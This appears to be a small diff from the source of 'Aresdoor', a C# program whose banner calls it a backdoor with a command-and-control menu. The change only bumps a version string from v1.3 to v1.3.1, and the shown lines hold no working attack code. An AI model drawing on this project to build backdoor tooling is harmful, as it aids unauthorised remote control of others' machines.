@@ -103,7 +103,7 @@ namespace aresdoor
 
                             aresdoorStartMenu += "+-------------------------------------------------------------+\n";
                             aresdoorStartMenu += "| Welcome to Aresdoor - a backdoor written by @BlackVikingPro |\n";
-                            aresdoorStartMenu += "| Current Version: v1.3                                       |\n";
+                            aresdoorStartMenu += "| Current Version: v1.3.1                                     |\n";
                             aresdoorStartMenu += "|                                                             |\n";
                             aresdoorStartMenu += "| C&C Menu Version: v1.0                                      |\n";
                             aresdoorStartMenu += "+-------------------------------------------------------------+\n";
